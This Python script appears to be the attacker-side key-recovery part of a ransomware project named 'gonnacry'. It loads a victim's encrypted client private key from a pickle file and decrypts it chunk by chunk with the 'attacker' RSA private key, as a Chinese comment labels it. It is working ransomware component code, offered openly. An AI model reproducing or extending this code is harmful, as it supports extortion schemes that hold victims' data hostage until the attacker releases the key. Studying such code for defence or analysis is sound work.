from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import base64
import pickle
import json

with open("../../../gonnacry/encrypted_client_private_key.key",'rb') as f:
            encrypted_client_private_key = pickle.load(f)
            
# print(type(encrypted_client_private_key))
# key_to_be_sent = base64.b64encode(str(encrypted_client_private_key).encode())

# data = key_to_be_sent.decode('UTF-8')

# data = base64.b64decode(data)

# enc = json.loads(encrypted_client_private_key)

# 讀取攻擊者的 RSA 私鑰（用來解密）
with open("../Server/private_key.key", "r") as f:
    attacker_private_key = f.read()

key = RSA.importKey(attacker_private_key)
cipher = PKCS1_OAEP.new(key)

decrypted = b""
for i in encrypted_client_private_key:
    ciphertext = cipher.decrypt(i)
    decrypted += ciphertext

print(decrypted.decode())